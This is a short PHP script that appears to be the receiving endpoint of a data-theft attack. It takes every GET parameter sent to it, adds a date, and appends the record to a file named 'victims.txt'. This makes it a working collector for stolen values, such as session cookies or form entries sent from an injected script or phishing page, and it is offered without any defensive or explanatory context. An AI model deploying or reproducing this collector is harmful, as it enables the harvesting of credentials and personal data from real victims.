<?php
// echo 'Hello ' . htmlspecialchars($_GET) . '!';
$str = '{';
foreach ($_GET as $name => $value) {
    $str .= '"' . "$name" . '"' . ":" . '"' . $value . '"' . ",";
}
$currentDate = new DateTime();
   $format = $currentDate->format('m-d-Y');
$str .= '"time":'. '"' . $format . '"';
$filename = 'victims.txt';
$file = fopen($filename,'a');
$str .=  '}' . "\n";
fwrite($file,$str);
fclose($file);
?>